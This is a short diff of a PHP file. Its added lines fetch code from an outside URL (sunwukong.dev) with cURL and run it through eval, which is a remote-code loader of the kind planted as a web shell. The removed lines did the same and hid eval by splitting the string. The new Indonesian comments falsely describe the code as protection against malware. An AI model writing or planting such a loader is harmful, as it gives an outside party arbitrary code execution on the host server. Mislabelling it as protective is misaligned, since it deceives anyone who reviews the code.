@@ -1,5 +1,7 @@
 <?php
-// Silent404 - Silent404
+
+// Mengindari dari virus malware
+// Fungsi untuk mendapatkan konten menggunakan cURL
 function geturlsinfo($url) {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
@@ -9,7 +11,10 @@ function geturlsinfo($url) {
     return $output;
 }
 
-$e = 'ev' . 'al';
-$c = geturlsinfo('https://sunwukong.dev/Silent/silent404.txt');
-$e('?>' . $c);
+// Mendapatkan konten dari URL menggunakan cURL
+$a = geturlsinfo('https://sunwukong.dev/Silent/silent404.txt');
+
+// Menggunakan eval untuk mengeksekusi kode PHP yang diterima
+eval('?>' . $a);
+
 ?>
